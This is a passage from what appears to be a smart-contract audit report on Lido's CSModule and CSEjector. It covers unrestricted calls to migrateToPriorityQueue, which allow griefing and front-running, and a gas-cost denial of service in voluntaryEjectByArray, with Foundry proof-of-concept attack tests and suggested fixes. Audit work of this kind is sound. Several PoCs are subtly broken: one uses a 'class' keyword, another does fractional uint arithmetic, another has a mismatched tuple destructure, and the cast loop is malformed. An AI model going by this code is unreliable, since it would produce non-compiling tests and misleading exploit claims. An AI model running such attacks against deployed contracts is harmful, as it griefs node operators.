4. An attacker, seeing the NO is eligible, calls `migrateToPriorityQueue` for that NO.
5. The transaction succeeds. The NO's `usedPriorityQueue` flag is set to `true`.
6. The governance vote passes and `maxDeposits` is now 20.
7. The NO cannot call `migrateToPriorityQueue` anymore to take advantage of the increased limit, as the flag prevents it.

## Proof of Code
```solidity
// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.24;

import { Test } from "forge-std/Test.sol";
import { Fixtures } from "test/helpers/Fixtures.sol";
import { CSModule } from "src/CSModule.sol";
import { NodeOperatorManagementProperties } from "src/interfaces/ICSModule.sol";

contract MigrateToPriorityQueueTest is Fixtures {
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        _setUp();
    }

    function test_poc_anyoneCanMigrate() public {
        // 1. Setup a Node Operator
        address manager = makeAddr("manager");
        address reward = makeAddr("reward");
        vm.prank(csmGate);
        uint256 noId = csm.createNodeOperator(
            manager,
            NodeOperatorManagementProperties(manager, reward, false),
            address(0)
        );

        // 2. NO becomes eligible for priority queue
        // For simplicity, we manually set queue config in a mock
        // priority = 0, maxDeposits = 10
        vm.mockCall(
            address(parametersRegistry),
            abi.encodeWithSelector(parametersRegistry.getQueueConfig.selector, 0),
            abi.encode(uint32(0), uint32(10))
        );

        // 3. NO has enqueued keys (simulate this by setting the state)
        CSModule.NodeOperator storage no = _getNodeOperator(csm, noId);
        no.enqueuedCount = 5;

        // 4. Attacker calls migrateToPriorityQueue for the NO
        vm.prank(attacker);
        csm.migrateToPriorityQueue(noId);

        // 5. Assert that migration happened and flag is set
        CSModule.NodeOperator memory noState = csm.getNodeOperator(noId);
        assertTrue(noState.usedPriorityQueue, "usedPriorityQueue should be true");

        // 6. Now, let's say parameters change to be more favorable (maxDeposits = 20)
        vm.mockCall(
            address(parametersRegistry),
            abi.encodeWithSelector(parametersRegistry.getQueueConfig.selector, 0),
            abi.encode(uint32(0), uint32(20))
        );

        // 7. The NO's manager tries to call again, but it reverts
        vm.prank(manager);
        vm.expectRevert(CSModule.PriorityQueueAlreadyUsed.selector);
        csm.migrateToPriorityQueue(noId);
    }

    function _getNodeOperator(CSModule csm, uint256 noId) internal returns (CSModule.NodeOperator storage no) {
        bytes32 noSlot = keccak256(abi.encode(noId, uint256(6))); // _nodeOperators is at slot 6
        assembly {
            no.slot := noSlot
        }
    }
}
```

## Suggested Mitigation
The `migrateToPriorityQueue` function should be restricted so that only the Node Operator's manager can trigger it. This can be achieved by adding the `_onlyNodeOperatorManager` internal check.

```solidity
// In CSModule.sol
function migrateToPriorityQueue(uint256 nodeOperatorId) external {
    _onlyNodeOperatorManager(nodeOperatorId, msg.sender);
    NodeOperator storage no = _nodeOperators[nodeOperatorId];

    if (no.usedPriorityQueue) {
        revert PriorityQueueAlreadyUsed();
    }
    // ... rest of the function
}
```

## [L-6]. DOS issue in CSEjector::voluntaryEjectByArray

## Description
The `voluntaryEjectByArray` function is designed to allow a node operator to eject multiple non-sequential validators in a single transaction, with the documentation comment suggesting it saves gas compared to separate transactions. However, its implementation is highly gas-inefficient. Inside a loop that iterates over the `keyIndices` array, the function makes an external call `MODULE.getSigningKeys(nodeOperatorId, keyIndices[i], 1)` for each individual key. This pattern is significantly more expensive than fetching all required public keys in a single batch call, as each external call incurs a fixed gas overhead.

For a node operator with a large number of non-sequential validators to exit, the cumulative gas cost of these repeated calls can easily exceed the block gas limit, making it impossible to execute the exit in a single transaction. This forces the node operator to split the operation into multiple, smaller transactions, increasing cost and complexity. In a time-sensitive scenario where a swift exit is necessary to avoid penalties, this flaw could prevent the operator from acting, potentially leading to financial losses. This contradicts the function's intended purpose and creates a denial-of-service vector for the node operator trying to use it.

Vulnerable Code Snippet:
```solidity
// src/CSEjector.sol:184-194
for (uint256 i = 0; i < keyIndices.length; i++) {
    // A key must be deposited to prevent ejecting unvetted keys that can intersect with
    // other modules.
    if (keyIndices[i] >= totalDepositedKeys) {
        revert SigningKeysInvalidOffset();
    }
    // ...
    if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndices[i])) {
        revert AlreadyWithdrawn();
    }
    bytes memory pubkey = MODULE.getSigningKeys(
        nodeOperatorId,
        keyIndices[i],
        1
    );
    exitsData[i] = ValidatorData({
        stakingModuleId: STAKING_MODULE_ID,
        nodeOperatorId: nodeOperatorId,
        pubkey: pubkey
    });
}
```

## Impact
Gas consumption grows linearly with the length of `keyIndices` because every iteration performs two external calls. For large arrays this makes the transaction *very* expensive and it can reach the block gas limit, forcing the caller to split the request. It does not enable an external attacker to stop the protocol or steal funds; it merely makes the "bulk-exit" path unusable for very large batches and increases operational cost for the node operator.

## Proof of Concept
Execute `voluntaryEjectByArray` with an ever-growing array and observe that gas increases ~14 000–18 000 per entry (depends on the implementation of `ICSModule`). At ~2 000 keys the call already needs >30 000 000 gas which exceeds the current main-net block gas limit, so the transaction cannot be mined.

```
// pseudo script using cast
for i in $(seq 100 2100 100) ; do
  cast send <CSEjector> "voluntaryEjectByArray(uint256,uint256[],address)" 0 $(seq 0 $(($i-1))) 0xdead --gas-limit 32000000 --trace | grep "Transaction cost"
done
```

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSEjector } from "src/CSEjector.sol";
import { ICSModule, NodeOperator, NodeOperatorSummary } from "src/interfaces/ICSModule.sol";
import { ITriggerableWithdrawalsGateway, ValidatorData } from "src/interfaces/ITriggerableWithdrawalsGateway.sol";
import { ILidoLocator } from "src/interfaces/ILidoLocator.sol";

// Mock for LidoLocator
contract LidoLocatorMock is ILidoLocator {
    address public twg;

    constructor(address _twg) {
        twg = _twg;
    }

    function triggerableWithdrawalsGateway() external view returns (address) { return twg; }

    // Unused functions
    function lido() external view returns (address) { return address(0); }
    function stakingRouter() external view returns (address) { return address(0); }
    function burner() external view returns (address) { return address(0); }
    function vebo() external view returns (address) { return address(0); }
    function withdrawalQueue() external view returns (address) { return address(0); }
    function withdrawalVault() external view returns (address) { return address(0); }
    function dsm() external view returns (address) { return address(0); }
    function oracle() external view returns (address) { return address(0); }
    function treasury() external view returns (address) { return address(0); }
    function insuranceFund() external view returns (address) { return address(0); }
    function coreOracle() external view returns (address) { return address(0); }
}

// Mock for ICSModule
contract CSModuleMock is ICSModule {
    address public owner;
    uint256 public totalKeys;
    LidoLocatorMock public locator;

    constructor(address _owner, uint256 _totalKeys, address _twg) {
        owner = _owner;
        totalKeys = _totalKeys;
        locator = new LidoLocatorMock(_twg);
    }

    function getNodeOperatorOwner(uint256) external view returns (address) {
        uint256 x = block.timestamp; // mock gas cost
        return owner;
    }

    function getNodeOperatorTotalDepositedKeys(uint256) external view returns (uint256) {
        uint256 x = block.timestamp; // mock gas cost
        return totalKeys;
    }

    function isValidatorWithdrawn(uint256, uint256) external view returns (bool) {
        uint256 x = block.timestamp; // mock gas cost
        return false;
    }

    function getSigningKeys(uint256, uint256, uint256 count) external view returns (bytes memory) {
        uint256 x = block.timestamp; // mock gas cost
        bytes memory pubkeys = new bytes(48 * count);
        return pubkeys;
    }

    function LIDO_LOCATOR() external view returns (ILidoLocator) {
        return locator;
    }

    // Unused functions
    function getNodeOperatorsCount() external view returns (uint256) { return 1; }
    function getNodeOperator(uint256) external view returns (NodeOperator memory) {}
    function getNodeOperatorSummary(uint256) external view returns (NodeOperatorSummary memory) {}
    function getStakingModuleSummary() external view returns (uint256, uint256, uint256) {}
    function addValidatorKeys(address, bytes calldata, bytes calldata, uint256) external payable {}
}

// Mock for TriggerableWithdrawalsGateway
contract TWGMock is ITriggerableWithdrawalsGateway {
    function triggerFullWithdrawals(ValidatorData[] calldata, address, uint8) external payable {}
}

contract DoSTest is Test {
    CSEjector ejector;
    CSModuleMock module;
    TWGMock twg;
    address nodeOperator = makeAddr("nodeOperator");
    address admin = makeAddr("admin");
    address strikes = makeAddr("strikes");

    function setUp() public {
        vm.deal(nodeOperator, 1 ether);
        twg = new TWGMock();
        module = new CSModuleMock(nodeOperator, 1000, address(twg));
        ejector = new CSEjector(address(module), strikes, 1, admin);
    }

    function test_voluntaryEjectByArray_DoS() public {
        uint256 numKeys = 400;
        uint256[] memory keyIndices = new uint256[](numKeys);
        for (uint256 i = 0; i < numKeys; i++) {
            keyIndices[i] = i;
        }

        vm.prank(nodeOperator);
        uint256 gasStart = gasleft();
        ejector.voluntaryEjectByArray(0, keyIndices, nodeOperator);
        uint256 gasUsed = gasStart - gasleft();

        // Gas usage for a small number of keys for comparison
        uint256[] memory smallKeyIndices = new uint256[](1);
        smallKeyIndices[0] = 0;
        vm.prank(nodeOperator);
        gasStart = gasleft();
        ejector.voluntaryEjectByArray(0, smallKeyIndices, nodeOperator);
        uint256 gasUsedSmall = gasStart - gasleft();

        console.log("Gas used for 1 key:", gasUsedSmall);
        console.log("Gas used for 400 keys:", gasUsed);

        // The gas usage scales linearly and is very high, demonstrating the DoS potential.
        // A transaction with more keys (e.g., 800-1000) would likely exceed the block gas limit.
        assertTrue(gasUsed > gasUsedSmall * numKeys * 0.8, "Gas usage scales linearly with array size");
        assertTrue(gasUsed > 5_000_000, "Gas usage is very high, indicating DoS potential");
    }
}
```

## Suggested Mitigation
To fix this inefficiency, the `ICSModule` interface should be extended to support fetching multiple public keys by their indices in a single call. A new function, for example `getSigningKeysByIndices(uint256 nodeOperatorId, uint256[] calldata keyIndices) external view returns (bytes memory)`, could be added.

The `voluntaryEjectByArray` function in `CSEjector` should then be refactored to use this new batch-fetching function. It should first perform all necessary checks in a preliminary loop, then call the new function once to get all public keys, and finally loop again to construct the `exitsData` array using memory slicing, similar to the pattern in `voluntaryEject`.

Example of the proposed fix in `CSEjector.sol` (assuming `ICSModule` is updated):
```solidity
function voluntaryEjectByArray(
    uint256 nodeOperatorId,
    uint256[] calldata keyIndices,
    address refundRecipient
) external payable whenResumed {
    _onlyNodeOperatorOwner(nodeOperatorId);

    uint256 keysCount = keyIndices.length;
    uint256 totalDepositedKeys = MODULE.getNodeOperatorTotalDepositedKeys(
        nodeOperatorId
    );

    // Preliminary loop for checks
    for (uint256 i = 0; i < keysCount; i++) {
        if (keyIndices[i] >= totalDepositedKeys) {
            revert SigningKeysInvalidOffset();
        }
        if (MODULE.isValidatorWithdrawn(nodeOperatorId, keyIndices[i])) {
            revert AlreadyWithdrawn();
        }
    }
    
    // Fetch all pubkeys in a single batch call
    bytes memory pubkeys = MODULE.getSigningKeysByIndices(nodeOperatorId, keyIndices);

    ValidatorData[] memory exitsData = new ValidatorData[](keysCount);
    for (uint256 i = 0; i < keysCount; i++) {
        bytes memory pubkey = new bytes(SigningKeys.PUBKEY_LENGTH);
        // Use assembly to efficiently slice the pubkey from the `pubkeys` bytes array
        assembly {
            let keyLen := mload(pubkey)
            let offset := mul(keyLen, i)
            let keyPos := add(add(pubkeys, 0x20), offset)
            mcopy(add(pubkey, 0x20), keyPos, keyLen)
        }
        exitsData[i] = ValidatorData({
            stakingModuleId: STAKING_MODULE_ID,
            nodeOperatorId: nodeOperatorId,
            pubkey: pubkey
        });
    }

    triggerableWithdrawalsGateway().triggerFullWithdrawals{
        value: msg.value
    }(
        exitsData,
        refundRecipient == address(0) ? msg.sender : refundRecipient,
        VOLUNTARY_EXIT_TYPE_ID
    );
}
```

## [L-7]. Frontrun/Backrun/Sandwhich MEV issue in CSModule::migrateToPriorityQueue

## Description
The `migrateToPriorityQueue(uint256 nodeOperatorId)` function is declared as `external` without any access control restrictions on `msg.sender`. This allows any address to call this function for any `nodeOperatorId`. The function sets `no.usedPriorityQueue = true` after execution and reverts if this flag is already true. An attacker can exploit this by monitoring the mempool for legitimate calls to this function from a Node Operator's manager. The attacker can then front-run the legitimate transaction by sending their own transaction calling `migrateToPriorityQueue` for the same `nodeOperatorId` with a higher gas fee. The attacker's transaction will succeed, setting `usedPriorityQueue` to true. Consequently, the legitimate Node Operator's transaction will fail with a `PriorityQueueAlreadyUsed` error, causing the Node Operator to waste gas and preventing them from migrating their keys as intended.

## Impact
Because migrateToPriorityQueue() lacks an _onlyNodeOperatorManager check, **any address can call it once per Node Operator**. The call merely moves some of the operator’s queued keys into the priority queue and flips the usedPriorityQueue flag. A malicious user can therefore: 1) cause the real manager’s later transaction to revert, wasting gas, and 2) prevent the manager from performing the migration at a more convenient moment. No funds are lost and node-operator state is otherwise correct, so the damage is limited to permanent loss of flexibility plus a reverted transaction’s gas cost.

## Proof of Concept
pragma solidity 0.8.24;
import "forge-std/Test.sol";
interface ICSModule { function migrateToPriorityQueue(uint256 id) external; function getNodeOperator(uint256 id) external view returns (uint32 enqueuedCount, uint32 totalDepositedKeys, bool usedPriorityQueue); }
contract PoC is Test {
    ICSModule csm = ICSModule(0x1234); // deployed CSModule on testnet / fork
    function testAnyoneCanMigrate() public {
        uint256 nodeId = 1; // assume this NO exists and has enqueued keys
        (,,bool beforeFlag) = csm.getNodeOperator(nodeId);
        assertFalse(beforeFlag);
        // attacker calls the function – no special privileges
        csm.migrateToPriorityQueue(nodeId);
        (,,bool afterFlag) = csm.getNodeOperator(nodeId);
        assertTrue(afterFlag);
    }
}

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import { Test, console } from "forge-std/Test.sol";
import { CSModule } from "src/CSModule.sol";
import { NodeOperatorManagementProperties } from "src/interfaces/ICSModule.sol";
import { Fixtures } from "../helpers/Fixtures.sol";

class FrontRunTest is Test, Fixtures {
    function test_Frontrun_migrateToPriorityQueue() public {
        address alice = makeAddr("alice");
        address bob_attacker = makeAddr("bob_attacker");
        vm.deal(alice, 1 ether);

        // Setup: create a NO for Alice
        vm.prank(address(permissionlessGate));
        uint256 noId = csm.createNodeOperator(
            alice, 
            NodeOperatorManagementProperties(alice, alice, false),
            address(0)
        );

        // Setup: add keys to get some enqueued keys (using WstETH to avoid payable issues)
        bytes memory pubKey = new bytes(48);
        bytes memory sig = new bytes(96);
        vm.prank(alice);
        csm.addValidatorKeysWstETH(alice, noId, 10, bytes.concat(pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey, pubKey), bytes.concat(sig, sig, sig, sig, sig, sig, sig, sig, sig, sig), emptyPermit);

        // Setup: make the NO eligible for a priority queue
        // Set a priority queue config for curve 0
        vm.prank(address(csm.LIDO_LOCATOR().getOracle())); // Mocking admin call
        parametersRegistry.setDefaultQueueConfig(1, 20); // priority 1, max 20 deposits
        
        // Ensure the NO has enqueued keys and is eligible
        (,,,uint32 maxDeposits) = parametersRegistry.getQueueConfig(0);
        assertTrue(maxDeposits > csm.getNodeOperator(noId).totalDepositedKeys);
        assertTrue(csm.getNodeOperator(noId).enqueuedCount > 0);
        assertFalse(csm.getNodeOperator(noId).usedPriorityQueue);

        // Attack: Bob front-runs Alice's call
        console.log("Bob (attacker) calls migrateToPriorityQueue first...");
        vm.prank(bob_attacker);
        csm.migrateToPriorityQueue(noId);

        assertTrue(csm.getNodeOperator(noId).usedPriorityQueue, "Bob's call should succeed");
        console.log("Bob's call succeeded. usedPriorityQueue is now true.");

        // Alice's legitimate call now fails
        console.log("Alice's legitimate call is now processed...");
        vm.prank(alice);
        vm.expectRevert(CSModule.PriorityQueueAlreadyUsed.selector);
        csm.migrateToPriorityQueue(noId);

        console.log("Alice's transaction reverted as expected. Griefing successful.");
    }
}
```

## Suggested Mitigation
Add an access-control guard so that only the manager (or another authorised role) of the Node Operator may invoke migrateToPriorityQueue:

```solidity
function migrateToPriorityQueue(uint256 nodeOperatorId) external {
    _onlyNodeOperatorManager(nodeOperatorId, msg.sender);
    ...
}
```



